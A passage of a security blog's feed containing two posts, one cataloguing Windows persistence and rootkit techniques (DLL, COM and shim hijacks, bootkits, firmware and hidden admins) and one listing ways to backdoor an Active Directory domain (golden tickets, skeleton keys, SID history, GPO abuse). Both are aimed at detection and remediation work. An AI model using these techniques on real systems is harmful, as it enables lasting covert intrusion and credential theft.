src=&quot;https://z6543.github.io/_img/certs.png&quot; width=&quot;318&quot; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/cert2.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/cert2.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/cert2.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;See, rootkit.exe totally looks legit, and it is filtered out when someone filters for &quot;Hide Windows entries&quot;.&lt;br /&gt;&lt;br /&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;span style=&quot;background-color: yellow;&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Hijack DLL load order&lt;/h3&gt;&lt;/div&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;Just place your DLL into a directory which is searched before the original DLL is found, and PROFIT! But again, to avoid lame detection, be sure to proxy the legitimate function calls to the original DLL. A good source on this topic from &lt;a href=&quot;https://www.mandiant.com/blog/dll-search-order-hijacking-revisited/&quot; target=&quot;_blank&quot;&gt;Mandiant&lt;/a&gt; and &lt;a href=&quot;http://digital-forensics.sans.org/blog/2015/03/25/detecting-dll-hijacking-on-windows/&quot; target=&quot;_blank&quot;&gt;DLL hijack detector&lt;/a&gt;.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;/div&gt;&lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tr-caption-container&quot; style=&quot;margin-left: auto; margin-right: auto; text-align: center;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/dll-hijack-detector.jpg&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/dll-hijack-detector.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/dll-hijack-detector.jpg&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;Here you can see how PlugX works in action, by dropping a legitimate Kaspersky executable, and hijacking the DLL calls with their DLL. &lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/Screen2BShot2B2017-07-052Bat2B20.22.14.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/Screen2BShot2B2017-07-052Bat2B20.22.14.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;635&quot; data-original-width=&quot;1405&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/Screen2BShot2B2017-07-052Bat2B20.22.14.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Hijack a shortcut from the desktop/start menu&lt;/h3&gt;&lt;div style=&quot;&quot;&gt;Never underestimate the power of lame tricks. Just create an executable which calls the original executable, and meanwhile starts your backdoor. Replace the link, PROFIT! And don't be a skiddie, check the icon ;) I have seen this trick in adware hijacking browsers a lot of times.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tr-caption-container&quot; style=&quot;margin-left: auto; margin-right: auto; text-align: center;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/ie.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/ie.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/ie.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tr-caption&quot; style=&quot;text-align: center;&quot;&gt;IE hijacked to start with http://tinyurl.com/2fcpre6&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;File association hijack&lt;/h3&gt;&lt;/div&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;Choose the user's favorite file type, replace the program which handles the opening with a similar one described in the previous section, and voila!&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;COM object hijack&lt;/h3&gt;&lt;div style=&quot;&quot;&gt;The main idea is that some COM objects are scanned for whether they are on the system or not, and when it is registered, it is automatically loaded. See &lt;a href=&quot;https://blog.gdatasoftware.com/blog/article/com-object-hijacking-the-discreet-way-of-persistence.html&quot; target=&quot;_blank&quot;&gt;COMpfun&lt;/a&gt; for details.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Windows Application Compatibility - SHIM&lt;/h3&gt;&lt;div style=&quot;&quot;&gt;Not many people are familiar with Windows Application Compatibility and how it works. Think about it as an added layer between applications and the OS. If the application matches a certain condition (e.g. filename), certain actions will take place. E.g. emulation of directories, registry entries, DLL injection, etc. In my installation, there are 367 different compatibility fixes (type of compatibility &quot;simulation&quot;), and some of those can be customized.&lt;/div&gt;&lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tr-caption-container&quot; style=&quot;margin-left: auto; margin-right: auto; text-align: center;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/sdb.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/sdb.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/sdb.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tr-caption&quot; style=&quot;text-align: center;&quot;&gt;Every time IE starts, inject a DLL into IE&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2 style=&quot;text-align: justify;&quot;&gt;Bootkits &lt;/h2&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;Although bootkits shown here can end up in Autoruns in the drivers section (as they might need a driver at the end of the day), I still think it deserves a different section.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;MBR - Master boot record&lt;/h3&gt;&lt;div style=&quot;&quot;&gt;Malware can overwrite the Master boot record, start the boot process with its own code, and continue the boot process with the original one. It is common for rootkits to fake the content of the MBR record, and show the original contents. Which means one just have attached the infected HDD to a clean system, and compare the first 512 bytes (or more in some cases) with a known, clean state, or compare it to the contents shown from the infected OS. SecureBoot can be used to prevent malware infections like this.&lt;/div&gt;&lt;/div&gt;&lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tr-caption-container&quot; style=&quot;margin-left: auto; margin-right: auto; text-align: center;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;a href=&quot;https://z6543.github.io/_img/mbr.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/mbr.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/mbr.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tr-caption&quot; style=&quot;font-size: 13px;&quot;&gt;There is a slight difference when MBR is viewed from infected OS vs clean OS&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;VBR - Volume boot record&lt;/h3&gt;&lt;div style=&quot;&quot;&gt;This is the next logical step where malware can start it's process, and some malware/rootkit prefers to hide it's startup code here. Check &lt;a href=&quot;http://arstechnica.com/security/2015/02/how-omnipotent-hackers-tied-to-the-nsa-hid-for-14-years-and-were-found-at-last/1/&quot; target=&quot;_blank&quot;&gt;GrayFish &lt;/a&gt;for details. SecureBoot can be used to prevent malware infections like this.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;BIOS/UEFI malware&lt;/h3&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;Both the old BIOS and the new UEFI can be modified in a way that malware starts even before the OS had a chance to run. Although UEFI was meant to be more secure than BIOS, implementation and design errors happens. Check the&lt;a href=&quot;http://securelist.com/analysis/publications/58278/absolute-computrace-revisited/&quot; target=&quot;_blank&quot;&gt; Computrace anti-theft rootkit&lt;/a&gt; for details.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Hypervisor - Ring -1 rootkit&lt;/h3&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;div style=&quot;&quot;&gt;This is somewhat special, because I believe although rootkit can run in this layer but it can't persist only in this layer on an average, physical machine, because it won't survive a reboot &lt;a href=&quot;http://blackhat.com/presentations/bh-usa-06/BH-US-06-Rutkowska.pdf&quot; target=&quot;_blank&quot;&gt;See Rutkowska's presentation from 2006&lt;/a&gt; But because the hypervisor can intercept the restart event, it can write itself into one of the other layers (e.g. install a common kernel driver), and simply delete it after it is fully functional after reboot. Update: There is a good paper from Igor Korkin about hypervisor detection &lt;a href=&quot;http://igorkorkin.blogspot.ru/2015/05/two-challenges-of-stealthy-hypervisors.html&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt;.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;SMM (System Management Mode) malware - Ring -2 rootkit&lt;/h3&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;Somehow related to the previous type of attacks, but not many people know that &lt;a href=&quot;http://en.wikipedia.org/wiki/System_Management_Mode#Problems&quot; target=&quot;_blank&quot;&gt;System Management Mode can be used to inject code into the OS&lt;/a&gt;. Check the DEITYBOUNCE malware for more details ;) Also, abusing &lt;a href=&quot;https://www.acsac.org/2014/workshops/mmf/Tamas%20Lengyel-Pitfalls%20of%20virtual%20machine%20introspection%20on%20modern%20hardware.pdf&quot; target=&quot;_blank&quot;&gt;Intel Dual Monitor Mode (DMM)&lt;/a&gt; can lead to untrusted code execution, which basically monitors the SMM mode.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Intel® Active Management Technology - Ring -3 rootkit&lt;/h3&gt;&lt;/div&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;According to Wikipedia, &quot;Intel Active Management Technology (AMT) is hardware and firmware technology for remote out-of-band management of personal computers, in order to monitor, maintain, update, upgrade, and repair them&quot;. You can ask, what could possibly go wrong? See &lt;a href=&quot;http://invisiblethingslab.com/resources/bh09usa/Ring%20-3%20Rootkits.pdf&quot; target=&quot;_blank&quot;&gt;Alexander Tereshkin's and Rafal Wojtczuk's great research&lt;/a&gt; on this, or &lt;a href=&quot;http://people.kth.se/~maguire/DEGREE-PROJECT-REPORTS/100402-Vassilios_Ververis-with-cover.pdf&quot; target=&quot;_blank&quot;&gt;Vassilios Ververis thesis about AMT&lt;/a&gt;. &lt;/div&gt;&lt;div style=&quot;&quot;&gt;As not many people click on links, let me quote the scary stuff about AMT:&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;div&gt;&lt;ul&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Independent of the main CPU&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Can access host memory via DMA (with restrictions)&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Dedicated link to NIC, and its filtering capabilities&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Can force host OS to reboot at any time (and boot the system from the emulated CDROM)&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Active even in S3 sleep!&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;&lt;/h2&gt;&lt;h2 style=&quot;text-align: justify;&quot;&gt;Other stuff&lt;/h2&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Create new user, update existing user, hidden admins&lt;/h3&gt;&lt;/div&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;Sometimes one does not even have to add malicious code to the system, as valid user credentials are more than enough. Either existing users can be used for this purpose, or new ones can be created. E.g. a good trick is to use the Support account with a 500 RID - see &lt;a href=&quot;http://xangosec.blogspot.com/2013/06/trojanizing-windows.html&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt;, Metasploit tool &lt;a href=&quot;https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/manage/enable_support_account.rb&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt;.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Esoteric firmware malware&lt;/h3&gt;&lt;div style=&quot;&quot;&gt;Almost any component in the computer runs with firmware, and by replacing the firmware with a malicious one, it is possible to start the malware. E.g. HDD firmware (see &lt;a href=&quot;http://arstechnica.com/security/2015/02/how-omnipotent-hackers-tied-to-the-nsa-hid-for-14-years-and-were-found-at-last/1/&quot; target=&quot;_blank&quot;&gt;GrayFish &lt;/a&gt;again), graphic card, etc.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Hidden boot device&lt;/h3&gt;&lt;div style=&quot;&quot;&gt;Malware can hide in one of the boot devices which are checked before the average OS is loaded, and after the malware is loaded, it can load the victim OS.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3&gt;Network-level backdoor&lt;/h3&gt;&lt;div style=&quot;&quot;&gt;Think about the following scenario: every time the OS boots, it loads additional data from the network. It can check for new software updates, configuration updates, etc. Whenever a vulnerable software/configuration update, the malware injects itself into the response, and get's executed. I know, this level of persistence is not foolproof, but still, possible. Think about the recently discovered &lt;a href=&quot;https://labs.mwrinfosecurity.com/blog/2015/04/02/how-to-own-any-windows-network-with-group-policy-hijacking-attacks/&quot; target=&quot;_blank&quot;&gt;GPO MiTM attack&lt;/a&gt;, the &lt;a href=&quot;https://github.com/infobyte/evilgrade&quot; target=&quot;_blank&quot;&gt;Evilgrade&lt;/a&gt; tool, or even the &lt;a href=&quot;https://www.blackhat.com/presentations/bh-dc-08/Oberheide/Whitepaper/bh-dc-08-oberheide-WP.pdf&quot; target=&quot;_blank&quot;&gt;Xensploit&lt;/a&gt; tool when we are talking about VM migration.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Software vulnerability&lt;/h3&gt;&lt;div style=&quot;&quot;&gt;Almost any kind of software vulnerability can be used as a persistent backdoor. Especially, if the vulnerability can be accessed remotely via the network, without any user interaction. Good old MS08-067...&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Hardware malware, built into the chipset&lt;/h3&gt;&lt;div style=&quot;&quot;&gt;I am not sure what to write here. Ask your local spy agency for further information. Good luck finding those!&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;More links&lt;/h3&gt;&lt;div&gt;Tools I highly recommend:&lt;/div&gt;&lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://technet.microsoft.com/en-us/sysinternals/bb545027.aspx&quot; target=&quot;_blank&quot;&gt;Sysinternals Autoruns&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://www.gmer.net/&quot; target=&quot;_blank&quot;&gt;GMER&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://digital-forensics.sans.org/blog/2015/03/25/detecting-dll-hijacking-on-windows/&quot; target=&quot;_blank&quot;&gt;DLL hijack detector&lt;/a&gt;&lt;/li&gt;&lt;li&gt;PCHunter&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.mandiant.com/resources/download/redline&quot; target=&quot;_blank&quot;&gt;Mandiant Redline&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/volatilityfoundation&quot; target=&quot;_blank&quot;&gt;Volatility&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/davehull/Kansa/&quot; target=&quot;_blank&quot;&gt;Kansa&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;For more information, check this blog post, &lt;a href=&quot;http://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services&quot; target=&quot;_blank&quot;&gt;part 1&lt;/a&gt;, &lt;a href=&quot;http://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order&quot; target=&quot;_blank&quot;&gt;part 2&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;Update 2017-04-29: A very nice list of Office persistence: &lt;a href=&quot;https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/&quot;&gt;https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;Update 2017-10-23: Persistence via Security Descriptors and ACLs: &lt;a href=&quot;https://www.youtube.com/watch?v=SeR4QJbaNRg&quot;&gt;https://www.youtube.com/watch?v=SeR4QJbaNRg&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;Update 2018-07-25: Backdooring LAPS &lt;a href=&quot;https://rastamouse.me/2018/03/laps---part-1/&quot;&gt;https://rastamouse.me/2018/03/laps---part-1/&lt;/a&gt;&lt;br /&gt;&lt;a href=&quot;https://rastamouse.me/2018/03/laps---part-2/&quot; target=&quot;_blank&quot;&gt;https://rastamouse.me/2018/03/laps---part-2/ &lt;/a&gt;&lt;br /&gt;&lt;br /&gt;I would like to thank to Gabor Pek from CrySyS Lab for reviewing and completing this post.&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>Thousand ways to backdoor a Windows domain (forest)</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/backdoor/domain/hack/windows/2015/03/05/Thousand-ways-to-backdoor-a-Windows-domain-(forest).html"/>
   <updated>2015-03-05T13:40:29+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/backdoor/domain/hack/windows/2015/03/05/Thousand-ways-to-backdoor-a-Windows-domain-(forest)</id>
   <content type="html">&lt;div style=&quot;&quot;&gt;&lt;div style=&quot;&quot;&gt;When the Kerberos elevation of privilege (CVE-2014-6324 / MS14-068) vulnerability has been made public, the remediation paragraph of the following blog post made some waves:&lt;br /&gt;&lt;a href=&quot;http://blogs.technet.com/b/srd/archive/2014/11/18/additional-information-about-cve-2014-6324.aspx&quot;&gt;http://blogs.technet.com/b/srd/archive/2014/11/18/additional-information-about-cve-2014-6324.aspx&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&quot;The only way a domain compromise can be remediated with a high level of certainty is a complete rebuild of the domain.&quot;&lt;br /&gt;&lt;br /&gt;Personally, I agree with this, but .... But whether this is the real solution, I'm not sure. And the same applies to compromised computers. When it has been identified that malware was able to run on the computer (e.g. scheduled scan found the malware), there is no easy way to determine with 100% certainty that there is no rootkit on the computer. Thus rebuilding the computer might be a good thing to consider. For paranoids, use new hardware ;)&lt;br /&gt;&lt;br /&gt;But rebuilding a single workstation and rebuilding a whole domain is not on the same complexity level. Rebuilding a domain can take weeks or months (or years, which will never happen, as the business will close before that).&lt;br /&gt;&lt;br /&gt;There are countless documented methods to backdoor a computer, but I have never seen a post where someone collects all the methods to backdoor a domain. In the following, I will refer to domain admin, but in reality, I mean Domain Admins, Enterprise Admins, and Schema Admins.&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;h3&gt;Ways to backdoor a domain&lt;/h3&gt;So here you go, an incomplete list to backdoor a domain:&lt;br /&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;Create a new domain admin user. Easy to do, easy to detect, easy to remediate&lt;/li&gt;&lt;li&gt;Dump password hashes. The attacker can either crack those or just pass-the-hash. Since KB2871997, pass-the-hash might be trickier (&lt;a href=&quot;https://technet.microsoft.com/library/security/2871997&quot;&gt;https://technet.microsoft.com/library/security/2871997&lt;/a&gt;), but not impossible. Easy to do, hard to detect, hard to remediate - just think about service user passwords. And during remediation, consider all passwords compromised, even strong ones.&lt;/li&gt;&lt;li&gt;Logon scripts - modify the logon scripts and add something malicious in it. Almost anything detailed in this post can be added :D&lt;/li&gt;&lt;li&gt;Use an already available account, and add domain admin privileges to that. Reset its password. Mess with current group memberships - e.g. &lt;a href=&quot;http://www.exploit-db.com/papers/17167/&quot;&gt;http://www.exploit-db.com/papers/17167/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;Backdoor any workstation where domain admins login. While remediating workstations, don't forget to clean the roaming profile. The type of backdoor can use different forms: malware, local admin, password (hidden admin with 500 RID), sticky keys, etc.&lt;/li&gt;&lt;li&gt;Backdoor any domain controller server. For advanced attacks, see &lt;a href=&quot;https://github.com/gentilkiwi/mimikatz/releases/tag/2.0.0-alpha-20150117&quot; target=&quot;_blank&quot;&gt;Skeleton keys &lt;/a&gt;&lt;/li&gt;&lt;li&gt;Backdoor files on network shares which are commonly used by domain admins by adding malware to commonly used executables - &lt;a href=&quot;https://github.com/secretsquirrel/the-backdoor-factory&quot; target=&quot;_blank&quot;&gt;Backdoor factory&lt;/a&gt;&lt;/li&gt;&lt;li&gt;Change ownership/permissions on AD partitions - if you have particular details on how to do this specifically, please comment&lt;/li&gt;&lt;li&gt;Create a new domain user. Hide admin privileges with SID history. Easy to do, hard to detect, easy to remediate - check &lt;a href=&quot;https://github.com/gentilkiwi/mimikatz&quot; target=&quot;_blank&quot;&gt;Mimikatz &lt;/a&gt;experimental for addsid&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://rycon.hu/papers/goldenticket.html&quot; target=&quot;_blank&quot;&gt;Golden tickets&lt;/a&gt; - easy to do, hard to detect, medium remediation&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://www.beneaththewaves.net/Projects/Mimikatz_20_-_Silver_Ticket_Walkthrough.html&quot; target=&quot;_blank&quot;&gt;Silver tickets&lt;/a&gt; - easy to do, hard to detect, medium/hard remediation&lt;/li&gt;&lt;li&gt;Backdoor workstations/servers via group policy&lt;/li&gt;&lt;ul&gt;&lt;li&gt;HKEY_LOCAL_MACHINE\ Software\ Microsoft\ Windows\ CurrentVersion\ RunOnce,&lt;/li&gt;&lt;li&gt;scheduled tasks (run task 2 years later),&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://www.labofapenetrationtester.com/2012/05/fun-with-sticky-keys-utilman-and.html&quot; target=&quot;_blank&quot;&gt;sticky-keys with debug&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=Mz9Bg9KAKBs&quot; target=&quot;_blank&quot;&gt;Backdoor patch management tool&lt;/a&gt;, see &lt;a href=&quot;https://www.trustedsec.com/files/Owning_One_Rule_All_v2.pdf&quot; target=&quot;_blank&quot;&gt;slides here&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;div&gt;[Update 2017.01.10]&lt;/div&gt;&lt;ul&gt;&lt;li&gt;Assign &lt;a href=&quot;http://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/&quot; target=&quot;_blank&quot;&gt;SeEnableDelegationPrivilege&lt;/a&gt; to a user &lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://adsecurity.org/?p=1714&quot; target=&quot;_blank&quot;&gt;Directory Service Restore Mode (DSRM)&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://adsecurity.org/?p=1760&quot; target=&quot;_blank&quot;&gt;Malicious Security Support Provider (SSP)&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://adsecurity.org/?p=1785&quot; target=&quot;_blank&quot;&gt;DSRMv2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://adsecurity.org/?p=1906&quot; target=&quot;_blank&quot;&gt;AdminSDHolder&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://adsecurity.org/?p=2716&quot; target=&quot;_blank&quot;&gt;Edit GPO&lt;/a&gt; &lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;&lt;br /&gt;&lt;h3&gt;Other tricks&lt;/h3&gt;The following list does not fit in the previous &quot;instant admin&quot; tips, but still, it can make the attackers life easier if their primary foothold has been disabled:&lt;br /&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;Backdoor recent backups - and when the backdoor is needed, destroy the files, so the files will be restored from the backdoored backup&lt;/li&gt;&lt;li&gt;Backdoor the Exchange server - get a copy of emails&lt;/li&gt;&lt;li&gt;Backdoor workstation/server golden image&lt;/li&gt;&lt;li&gt;Change permission of logon scripts to allow modification later&lt;/li&gt;&lt;li&gt;Place malicious symlinks to file shares, collect hashes via SMB auth tries on specified IP address, grab password hashes later&lt;/li&gt;&lt;li&gt;Backdoor remote admin management e.g. HP iLO - e.g. create new user or steal current password&lt;/li&gt;&lt;li&gt;Backdoor files e.g. on shares to use in SMB relay&lt;/li&gt;&lt;li&gt;Backdoor source code of in-house-developed software&lt;/li&gt;&lt;li&gt;Use any type of sniffed or reused passwords in new attacks, e.g. network admin, firewall admin, VPN admin, AV admin, etc.&lt;/li&gt;&lt;li&gt;Change the content of the proxy pac file (change browser configuration if necessary), including special exception(s) for a chosen domain(s)  to use proxy on malicious IP. Redirect the traffic, enforce authentication, grab password hashes, ???, profit.&lt;/li&gt;&lt;li&gt;Create high privileged users in applications running with high privileges, e.g. MSSQL, Tomcat, and own the machine, impersonate users, grab their credentials, etc. The typical pentest path made easy.&lt;/li&gt;&lt;li&gt;Remove patches from servers, change patch policy not to install those patches.&lt;/li&gt;&lt;li&gt;Steal Windows root/intermediate CA keys&lt;/li&gt;&lt;li&gt;Weaken AD security by changing group policy (e.g. re-enabling LM-hashes)&lt;/li&gt;&lt;/ul&gt;Update [2015-09-27]: I found this &lt;a href=&quot;https://www.youtube.com/watch?v=w6761-NWmj4&quot; target=&quot;_blank&quot;&gt;great presentation&lt;/a&gt; from Jakob Heidelberg. It mentions (at least) the following techniques, it is worth to check these:&lt;br /&gt;&lt;ul&gt;&lt;li&gt;Microsoft Local Administrator Password Solution&lt;/li&gt;&lt;li&gt;Enroll virtual smart card certificates for domain admins&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;&lt;h3&gt;Forensics&lt;/h3&gt;&lt;div&gt;If you have been chosen to remediate a network where attackers gained domain admin privileges, well, you have a lot of things to look for :)&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;I can recommend two tools which can help you during your investigation:&lt;/div&gt;&lt;div&gt;&lt;br 